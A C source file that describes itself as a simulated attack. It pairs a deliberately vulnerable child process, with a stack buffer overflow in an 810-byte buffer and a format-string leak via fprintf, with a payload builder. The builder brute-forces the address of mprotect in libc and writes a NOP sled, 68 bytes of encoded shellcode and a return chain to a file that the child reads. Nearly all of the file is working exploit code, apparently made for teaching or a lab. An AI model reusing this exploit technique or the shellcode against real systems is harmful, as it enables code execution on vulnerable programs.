/*
  This file contains the source code of a simulated attack process.
  - The simulated vulnerable program contains one stackoverflow vulnerability
    in "buf[810]" and one memeryleak vulnerability performed by "fprint".
  - The attack iterates through the whole libc in the memory to find "mprotect()",
    which will then return to our shellcode to finish the exploit.  
*/
#include <stdio.h>
#include <wait.h>

const char recover[]="%x.%218$x.%214$x";
FILE *rf;
unsigned int probCount=0;

unsigned int getLibc()
{
  unsigned int addr;
  FILE *fd=fopen("libc","r");
  fscanf(fd,"%x",&addr);
  fclose(fd);
  return addr;
}

void storeLibc( unsigned int addr)
{
  FILE *fd=fopen("libc","w");
  fprintf(fd,"%x",addr);
  fclose(fd);
}

void buildpayload ()
{
    unsigned int libc_addr=getLibc();
    FILE *fd=fopen("command","r");
    unsigned char payload[1000];
    memset(payload,0,1000);
    unsigned int Padding = 200;
    unsigned int libc;
    unsigned int *gs=(unsigned int *)&payload[810];
    unsigned int *mprotect=(unsigned int *)&payload[814+12];
    unsigned int *shell_addr=(unsigned int *)&payload[818+12];
    unsigned int *arg_sa=(unsigned int *)&payload[822+12];
    unsigned int *arg_len=(unsigned int *)&payload[826+12];
    unsigned int *arg_flag=(unsigned int *)&payload[830+12];
    
    payload[0]='S';
    fscanf(fd,"%x.%x.%x",shell_addr,&libc,gs);
    fclose(fd);
    (*shell_addr)++;
    (*arg_sa) = (*shell_addr)&0xfffff000;
    (*arg_len) = 0x01010101;
    (*arg_flag) = 7;
    if (libc_addr == 0xfffffff)
        //libc_addr=libc-1734120;
        libc_addr=libc+0x100000+0xa0000;
    else
        libc_addr--;
    storeLibc(libc_addr);
    (*mprotect) = libc_addr;
    unsigned char nop= '\x90';
    // ShellCode
    unsigned int len=68;
    unsigned char buf[] = 
    "\xda\xcd\xbb\x95\x0f\xae\xe6\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
    "\x0b\x31\x5d\x18\x83\xc5\x04\x03\x5d\x81\xed\x5b\x8c\xa2\xa9"
    "\x3a\x03\xd2\x21\x10\xc7\x93\x55\x02\x28\xd0\xf1\xd3\x5e\x39"
    "\x60\xbd\xf0\xcc\x87\x6f\xe5\xc8\x47\x90\xf5\xfa\x68\xc0\x82"
    "\x6c\x77\xb7\x3f\xf9\x96\xfa\x40";

    int i=0;
    for(;i<(809-Padding-len);i++)
      payload[i+1]=nop;
    for(i=0;i<len;i++)
      payload[i+810-Padding-len]=buf[i];
    for(i=0;i<Padding;i++)
      payload[i+810-Padding]=nop;

    fd=fopen("command","wb");
    fwrite(payload,sizeof(char),1000,fd);
    fclose(fd);
}

int main (int argc, char *argv[])
{
    pid_t pid;
    storeLibc(0xfffffff);
    while (1)
    {  
        pid = fork();
        
        if (pid == 0)	// Child Process
        {   // Child code
            FILE *file;
	    // Buffer Size = 810
            char buf[810];
	    while(1)
            { file=fopen("command","r");
              fscanf(file,"%s",buf);
	      if (buf[0]=='S')
	      { fclose(file);
		file=fopen("command","rb");
		    // Overflow happens here
	        fread(buf,sizeof(char),1000,file);
 	      }
              fclose(file);
              
	      if (buf[0]!='S')
              {   // Memory Leak
		  file=fopen("command","w");
                  fprintf(file,buf);
                  fclose(file);

		  // Build Payload
		  buildpayload();
	      }
	      else
	      // Exploit HERE!
	      {   return 0; }
            }
        }
        else if (pid > 0)	// Parent Process
        {
            printf("Child Created. Pid = %d\n Libc prob: %x\n Count: %x\n",pid,getLibc(),probCount++);
            waitpid(pid,NULL,0);
            rf=fopen("command","w");
            fprintf(rf,"%s",recover);
            fclose(rf);
            continue;
        }
        else		// Failed
        {   printf("Fork Failed! \n");
            return 0;
        }
    }
}
